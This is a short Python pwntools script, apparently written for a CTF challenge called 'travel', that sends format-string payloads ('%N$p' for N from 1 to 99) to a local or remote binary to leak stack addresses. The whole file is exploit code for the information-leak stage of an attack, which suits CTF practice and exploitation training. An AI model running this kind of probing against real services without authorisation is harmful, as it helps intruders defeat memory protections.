import pwn
import threading

# remove debug output
pwn.context.log_level = 'WARNING'

LOCAL = "./travel"
REMOTE = ["01.linux.challenges.ctf.thefewchosen.com", 60509]

def thread(func):
    def wrapper(*args, **kwargs):
        thread = threading.Thread(target=func, args=args, kwargs=kwargs)
        thread.start()
        return thread
    return wrapper

class Exploit:
    def __init__(self, local=False, multipocess=False):
        if local:
            self.p = "pwn.process(LOCAL)"
        else:
            self.p = "pwn.remote(REMOTE[0], REMOTE[1])"
        if multipocess:
            self.send_format_str = thread(self.send_format_str)
            self.multiprocess = True
        else:
            self.multiprocess = False
    
    def send_format_str(self, num):
        'sending format string to leak the address'
        # num = 33
        with eval(self.p) as r:
            try:
                payload = (f"%{num}$p").encode()
                p = r.recv(100)
                p = r.sendline(payload)
                p = r.recv(100)
                print(f"{num}: {p}")
            except:
                pass
            
    def leaking(self):
        '''start leaking...'''
        for i in range(1, 100):
            self.send_format_str(i)
            if self.multiprocess:
                if i % 10 == 0:
                    for thread in threading.enumerate():
                        if thread is not threading.current_thread():
                            thread.join()

Exploit(local=True, multipocess=False).leaking()

